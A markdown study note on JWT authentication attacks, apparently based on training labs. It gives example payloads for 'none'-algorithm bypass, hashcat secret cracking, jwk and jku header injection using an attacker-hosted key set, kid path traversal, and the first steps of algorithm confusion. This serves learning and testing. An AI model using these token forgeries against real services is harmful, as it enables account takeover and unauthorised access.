# Content 
- [jwt structure](#jwt-structure)
- [Accepting arbitrary signatures](#accepting-arbitrary-signatures)
- [Accepting tokens with no signature](#accepting-tokens-with-no-signature)
- [Brute-forcing secret keys](#brute-forcing-secret-keys)
- [JWT header parameter injections](#jwt-header-parameter-injections)
  - [Injecting self-signed JWTs via the jwk parameter](#injecting-self-signed-jwts-via-the-jwk-parameter)
  - [Injecting self-signed JWTs via the jku parameter](#injecting-self-signed-jwts-via-the-jku-parameter)
  - [Injecting self-signed JWTs via the kid parameter](#injecting-self-signed-jwts-via-the-kid-parameter)
- [Algorithm confusion attacks](#algorithm-confusion-attacks)




## jwt structure
1) Header



| Header Parameter | Description                                             |
|------------------|---------------------------------------------------------|
| `alg`                        | Algorithm used for signing/verifying the token (e.g., HS256).     |
| `typ`                        | Type of the token (usually "JWT").                     |
| `cty`                        | Content Type, indicating the media type of the token.  |
| `kid` (Key ID)               | Key ID, used to identify the key for verification.      |
| `jwk` (JSON Web Key)         | Provides an embedded JSON object representing the key.                                |
| `jku` (JSON Web Key Set URL) | Provides a URL from which servers can fetch a set of keys containing the correct key. |



2) Payload
- Registered Claims


| Claim             | Description                                                |
|-------------------|------------------------------------------------------------|
| `iss` (Issuer)    | The entity that issued the JWT.                            |
| `sub` (Subject)   | The subject of the JWT, often a user ID.                   |
| `aud` (Audience)  | The intended audience for the JWT.                        |
| `exp` (Expiration) | The time after which the token should not be accepted.   |
| `nbf` (Not Before) | The time before which the token should not be accepted. |
| `iat` (Issued At) | The time at which the JWT was issued.                     |
| `jti` (JWT ID)     | A unique identifier for the token.                         |

- **Public claims:** are intended for use across different applications or by multiple parties.
- **Private Claims:** are specific to a particular application, organization, or use case, and their names are not required to follow standardized conventions.  

3) Signature


JWT token Example : 
```jwt
Header: {
  "alg": "HS256",
  "typ": "JWT"
}

Payload: {
  "iss": "example.com",
  "sub": "1234567890",
  "aud": "myapp",
  "exp": 1677648242,
  "nbf": 1677644642,
  "iat": 1677644642,
  "jti": "a1b2c3d4e5"
  // Custom claims:
  "username": "johndoe",
  "role": "admin"
}

Signature: (Generated using the HMAC-SHA256 algorithm)

```

## Accepting arbitrary signatures
- edit `sub` to another user ex:admin 
- sign the jwt token and send it

## Accepting tokens with no signature
- Setting the alg parameter to "none" is discouraged due to its inherent security risks. 
- Many servers reject unsigned tokens to prevent vulnerabilities. 
- This filtering is based on string parsing, making it possible to bypass such filters using obfuscation techniques like mixed capitalization and unexpected encodings.
```
None
none
NONE

```
## Brute-forcing secret keys
- [jwt secrets list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)
```shell
hashcat -a 0 -m 16500 <jwt> <wordlist> --show

=> <jwt>:<identified-secret>
```


# JWT header parameter injections
## Injecting self-signed JWTs via the jwk parameter
- servers should only use a limited whitelist of public keys to verify JWT signatures.
- misconfigured servers sometimes use any key that's embedded in the jwk parameter.
- You can exploit this behavior by signing a modified JWT using your own RSA private key, then embedding the matching public key in the jwk header.

```json
{
    "kid": "28efc4b6-122a-41ae-9c22-f162a3f4266f",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "28efc4b6-122a-41ae-9c22-f162a3f4266f",
        "n": "qFS9f6gM6Ez6GuNQPJEHfVnwKXE0B7kUIWs4DWigfKx2fNoi5_N72_y4r2OB2IZn0PFBswo1QFTAIVCHqwEMozN16yVWkoRIwzfVeXj7cpTlr7JpWVvbkiEM0SkMgAvP0Rm2wua7d79C5KIQy6kCD7u63Ma45i0EIxpBDqFK788"
    }
}
```
- `e`: The public exponent of the RSA key.
- `n`: The modulus of the RSA key.
- `kid` in the header matches the `kid` in the `jwk`

## Injecting self-signed JWTs via the jku parameter
- some servers let you use the jku (JWK Set URL) header parameter to reference a JWK Set containing the key.
- More secure websites will only fetch keys from trusted domains, but you can sometimes take advantage of URL parsing discrepancies to bypass this kind of filtering.
- You can exploit this behavior by signing a modified JWT using your own RSA private key, then embedding `jku` pointing to a url containing the public key (make sure the `kid` is the same at both).

example of exploit:
```json
{
    "jku": "https://exploit-0a97008704342d7880177f19017b0059.exploit-server.net/exploit.json",
    "kid": "80ee234a-f38f-49f2-9608-7388e11db35e",
    "alg": "RS256"
}
```


example of the file containing the keys :
```json
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "80ee234a-f38f-49f2-9608-7388e11db35e",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
        }
    ]
}
```
- JWK Sets like this are sometimes exposed publicly via a standard endpoint, such as `/.well-known/jwks.json`.

## Injecting self-signed JWTs via the kid parameter
- `kid` parameter may point to a particular entry in a database, or a name of a file
- If this parameter is also vulnerable to directory traversal, an attacker could potentially force the server to use an arbitrary file from its filesystem as the verification key.
  - if the server also supports JWTs signed using a **symmetric algorithm**.
  - point the `kid` parameter to a predictable, static file, EX: `/dev/null`
  - sign the JWT using a secret that matches the contents of this file.  
```json
{
    "kid": "../../path/to/file",
    "typ": "JWT",
    "alg": "HS256",
    "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
}
```
- the `kid` header parameter is also a potential vector for **SQL injection** attacks. 

## Algorithm confusion attacks
1) Obtain the server's public key

   
Servers sometimes expose their public keys as JSON Web Key (JWK) objects via a standard endpoint mapped to `/jwks.json` or `/.well-known/jwks.json`


2) Convert the public key to a suitable format


In order for the attack to work, the version of the key that you use to sign the JWT must be identical to the server's local copy. In addition to being in the same format, every single byte must match, including any non-printing characters. 
